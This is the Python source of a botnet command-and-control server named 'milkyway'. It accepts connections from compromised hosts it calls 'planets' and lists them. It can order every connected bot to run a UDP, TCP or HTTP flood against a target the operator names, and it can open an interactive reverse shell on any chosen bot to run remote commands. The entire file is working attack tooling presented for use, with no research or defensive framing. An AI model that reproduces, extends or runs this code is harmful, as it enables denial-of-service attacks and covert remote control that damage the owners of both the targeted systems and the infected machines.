#!/usr/bin/env python3

# import libraries
from signal import signal, SIGINT
import threading
import socket
import sys
import os
import time
import random
import struct
import string
import datetime as dt

# get platform
if sys.platform in ("linux", "linux2"):
    galaxy_os = "linux"
elif sys.platform == "darwin":
    galaxy_os = "mac"
elif sys.platform == "win32":
    galaxy_os = "windows"
else:
    print("This platform is unsupported.")
    os._exit(0)

# functions
def wait_for_threads():
    while open_threads > 0:
        time.sleep(0.1)

def get_real_time():
    ntp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    msg = '\x1b' + 47 * '\0'
    ntp_socket.sendto(msg.encode(), ("pool.ntp.org", 123))
    msg, _ = ntp_socket.recvfrom(1024)
    t = int(struct.unpack("!12I", msg)[10]) - 2208988800
    time_new = dt.datetime.fromtimestamp(t)
    return time_new.strftime("hours: %H minutes: %M seconds: %S")

def gen_planet_id():
    planet_id = ""
    for _ in range(25):
        num_or_str = random.randint(1, 2)
        if num_or_str == 1:
            num = random.randint(1, 9)
            planet_id = f"{planet_id}{num}"
        elif num_or_str == 2:
            letter_num = random.randint(0, 25)
            letter = list(string.ascii_lowercase)[letter_num]
            letter_case = random.randint(1, 2)
            if letter_case == 2:
                letter = letter.upper()
            planet_id = f"{planet_id}{letter}"
    return planet_id

def exit_handler(sig, frame, **kwargs):
    global galaxy_status
    galaxy_status = "offline"
    galaxy_socket.close()
    if "cmd" in kwargs:
        print("| Exiting...")
    else:
        print("\n| Exiting...")
    wait_for_threads()
    os._exit(0)

def clear():
    if galaxy_os in ('linux', 'mac'):
        os.system("clear")
    elif galaxy_os == "windows":
        os.system("cls")

def bind_port():
    global galaxy_status, shell_socket, galaxy_socket
    while galaxy_status == "offline":
        try:
            galaxy_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            shell_socket = socket.socket()
            galaxy_socket.bind(("0.0.0.0", galaxy_port))
            shell_socket.bind(("0.0.0.0", shell_port))
            galaxy_socket.listen()
            shell_socket.listen()
            galaxy_socket.settimeout(0.5)
            shell_socket.settimeout(0.5)
            galaxy_status = "online"
        except OSError as e:
            if str(e) == "[Errno 98] Address already in use":
                print(f"ERROR: Port {galaxy_port} is already in use. Retrying in 5 seconds...")
                time.sleep(10)

def planet_handler():
    global open_threads
    while galaxy_status == "online":
        try:
            planet, addr = galaxy_socket.accept()
            planets.append(planet)
            planet_ips.append(addr)
            planet_ids.append(gen_planet_id())
            id_loc = len(planet_ids) - 1
            planet.send(f"planet ID: {planet_ids[id_loc]}".encode())
        except TimeoutError:
            pass
        except OSError as e:
            if "Bad file descriptor" in str(e):
                open_threads -= 1
                return
            else:
                print("| ERROR: An unexpected error occured. Please open an issue here: https://git.disroot.org/Galaxia/milkyway/issues")
                print(f"| {e}")
        for planet_handler_i, _ in enumerate(planet_ids):
            try:
                data = planets[planet_handler_i].recv(1024).decode("ascii").lower()
                print(data)
            except BrokenPipeError:
                del planets[planet_handler_i]
                del planet_ips[planet_handler_i]
                del planet_ids[planet_handler_i]
    open_threads -= 1

def ddos(cmd_ddos):
    if len(planets) == 0:
        print("| ERROR: There are no planets connected to attack with.")
        return
    try:
        targetAddr, targetPort, floodType = cmd_ddos.replace("ddos ", "").strip().split()
    except ValueError:
        print("| ERROR: One or more arguments not specified.")
        return
    if floodType not in ('udp', 'tcp', 'http'):
        print("| ERROR: Invalid attack type. Please enter a valid attack type.")
        return
    try:
        targetPort = int(targetPort)
    except ValueError:
        print("| ERROR: Invalid port. Please enter a valid number.")
        return
    try:
        trimmedAddr = str(targetAddr).replace("https://", "").replace("http://", "").replace("www.", "")
        targetAddr = socket.gethostbyname(trimmedAddr)
    except socket.gaierror:
        print("| ERROR: Invalid address. Please enter a valid and online domain or IPv4 address.")
        return
    if floodType == "udp":
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    elif floodType in ('tcp', 'http'):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((targetAddr, targetPort))
        s.close()
    except ConnectionRefusedError:
        print("| ERROR: Invalid port. Please enter an open port.")
        return
    planet_msg = f"ddos {targetAddr} {targetPort} {floodType}"
    for ddos_i, _ in enumerate(planet_ids):
        try:
            planets[ddos_i].send(planet_msg.encode())
        except BrokenPipeError:
            del planets[ddos_i]
            del planet_ips[ddos_i]
            del planet_ids[ddos_i]

def shell(cmd_shell):
    global shell_buf_size
    shell_buf_size = 128
    new_cmd = cmd_shell.replace("shell ", "").strip().split()
    if len(new_cmd) == 1:
        shelled_planet_id = new_cmd
    else:
        shelled_planet_id, shell_buf_size = new_cmd
    shelled_planet_id = str(shelled_planet_id).replace("['", "").replace("']", "").strip()
    if shelled_planet_id not in planet_ids:
        print("| ERROR: The planet ID specified does not exist.")
        shell_socket.close()
        return
    shell_buf_size = int(str(shell_buf_size).replace("['", "").replace("']", "").strip())
    shelled_planet = planets[int(planet_ids.index(shelled_planet_id))]
    shell_buf_size = shell_buf_size * 1024
    shelled_planet.send(f"shellcmd start bufsize {shell_buf_size}".encode())
    while True:
        try:
            shell_planet, _ = shell_socket.accept()
            shelled_planet_cwd = shell_planet.recv(shell_buf_size).decode()
            break
        except OSError as e:
            if "Bad file descriptor" in str(e):
                return
            else:
                print("| ERROR: An unexpected error occured. Please open an issue here: https://git.disroot.org/Galaxia/milkyway/issues")
                print(f"| {e}")
    clear()
    print(milkyway_logo)
    print("Type 'exit' to leave shell.")
    print("NOTE: Commands that require input will not work!\n")
    while shelled_planet in planets:
        shell_cmd = input(f"{shelled_planet_id} | {shelled_planet_cwd} > ")
        shell_cmd = f"{shell_cmd}"
        shell_planet.send(shell_cmd.encode())
        if shell_cmd.lower() == "exit":
            clear()
            print(milkyway_logo)
            print("Type 'help' for a list of commands.\n")
            shell_socket.close()
            break
        output = shell_planet.recv(shell_buf_size).decode()
        result, shelled_planet_cwd = output.split("<sep>")
        print(result)
    if not shelled_planet in planets:
        clear()
        print(milkyway_logo)
        print("ERROR: Shelled planet is now offline.")
        print("Type 'help' for a list of commands.\n")
        shell_socket.close()

# logo
milkyway_logo = """
||||||||||| ||||||||| |||       |||   ||| |||   ||| ||| ||| ||| ||||||||| |||   |||
||| ||| |||    |||    |||       ||||||    ||||||||| ||| ||| ||| |||   ||| |||||||||
||| ||| |||    |||    |||       |||   |||    |||    ||| ||| ||| |||||||||    |||
||| ||| ||| ||||||||| ||||||||| |||   |||    |||    ||||||||||| |||   |||    |||
"""

# exit handler
signal(SIGINT, exit_handler)

# variables
galaxy_status = "offline"
galaxy_port = 9999
galaxy_socket = ""
shell_port = 10000
shell_buf_size = 128
shell_socket = ""
planets = []
planet_ips = []
planet_ids = []
planets_shelled = []
planets_attacking = []
open_threads = 0

# bind to port
bind_port()
planet_handler_thread = threading.Thread(target=planet_handler)
planet_handler_thread.start()
open_threads += 1

# main stuff
clear()
print(milkyway_logo)
print("Type 'help' for a list of commands.\n")
while True:
    cmd = input("> ")
    if cmd == "help":
        print("| ddos <address> <port> <type>")
        print("| |-> Launches a DDoS attack using all connected planets.")
        print("| |-> Address must either be a domain, or an IPv4 address.")
        print("| |-> Types: tcp, http, udp")
        print("| shell <planet-id> <buffer-size>")
        print("| |-> Opens a reverse shell on a the specified planet.")
        print("| |-> Buffer size is measured in KB. If not specified, it will be set to 128KB.")
        print("| list")
        print("| |-> Lists all connected planets.")
        print("| exit")
        print("| |-> Exits milkyway.")
    elif cmd == "list":
        if len(planets) > 0:
            print("| Connected planets:")
            for i, planet_ip in enumerate(planet_ips):
                planet_ip_list = list(planet_ip)
                planet_ip_port = f"{planet_ip_list[0]}:{planet_ip_list[1]}"
                print(f"| {i + 1}. IP/Port: {planet_ip_port} | ID: {planet_ids[i]}")
        else:
            print("| There are no planets connected.")
    elif cmd == "exit":
        exit_handler("", "", cmd=True)
    elif "ddos" in cmd:
        ddos(cmd)
    elif "shell" in cmd:
        shell(cmd)
    else:
        print("| Invalid command.")
